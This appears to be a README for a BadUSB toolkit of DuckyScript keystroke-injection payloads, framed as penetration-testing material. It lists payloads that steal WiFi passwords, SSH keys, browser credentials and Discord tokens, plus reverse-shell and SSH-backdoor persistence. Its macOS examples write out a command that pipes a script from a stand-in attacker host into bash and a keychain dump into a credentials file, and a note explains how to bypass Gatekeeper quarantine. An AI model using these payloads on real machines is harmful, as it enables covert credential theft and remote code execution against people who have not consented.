# BadUSB Payloads

## Overview

80 DuckyScript payloads organized by category for penetration testing and security research.

## Categories

### 🔍 Reconnaissance (10 payloads)
- `recon/system_info.txt` — Enumerate OS, hardware, network
- `recon/wifi_survey.txt` — List nearby WiFi networks
- `recon/installed_apps.txt` — Inventory installed software
- `recon/browser_history.txt` — Extract browsing history
- `recon/network_map.txt` — Map local network topology

### 📤 Exfiltration (10 payloads)
- `exfil/wifi_passwords.txt` — Extract saved WiFi credentials
- `exfil/ssh_keys.txt` — Copy SSH private keys
- `exfil/browser_creds.txt` — Dump browser saved passwords
- `exfil/clipboard_steal.txt` — Capture clipboard contents
- `exfil/discord_tokens.txt` — Extract Discord tokens

### 🔐 Persistence (10 payloads)
- `persist/reverse_shell.txt` — Establish reverse shell
- `persist/scheduled_task.txt` — Create persistent scheduled task
- `persist/startup_entry.txt` — Add to startup programs
- `persist/ssh_backdoor.txt` — Install SSH backdoor
- `persist/cron_persist.txt` — Linux cron job persistence

### 🎭 Social Engineering (10 payloads)
- `social/fake_update.txt` — Display fake update screen
- `social/phish_portal.txt` — Deploy credential capture page

## Writing Custom Payloads

```duckyscript
REM My custom payload
DELAY 1000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000
STRING Write-Output "Hello from NullSec"
ENTER
```

## macOS Payloads

macOS payloads follow standard DuckyScript syntax but require platform-specific adjustments:

- Use `COMMAND` instead of `GUI` for keyboard shortcuts
- Use `CTRL+SHIFT+4` for screenshots instead of `PRNTSCREEN`
- Terminal commands replace PowerShell/Command Prompt
- `COMMAND SPACE` opens Spotlight for quick app launching

### macOS Examples

**Terminal Execution:**
```duckyscript
DELAY 1000
COMMAND SPACE
DELAY 500
STRING terminal
ENTER
DELAY 1000
STRING curl http://attacker.com/script.sh | bash
ENTER
```

**Credential Harvest:**
```duckyscript
DELAY 1000
COMMAND SPACE
DELAY 500
STRING keychain
ENTER
DELAY 1000
STRING security dump-keychain -d login.keychain > /tmp/creds.txt
ENTER
```

### Notes
- macOS Gatekeeper may block unsigned scripts; use `xattr -d com.apple.quarantine <file>`
- T2/M1 chip security restrictions may limit certain persistence methods
- Always test payloads on a VM before deployment

## OS Compatibility

| Payload | Windows | macOS | Linux |
|---------|:-------:|:-----:|:-----:|
| Recon | ✅ | ✅ | ✅ |
| Exfil | ✅ | ✅ | ✅ |
| Persist | ✅ | ⚠️ | ✅ |
| Social | ✅ | ✅ | ❌ |
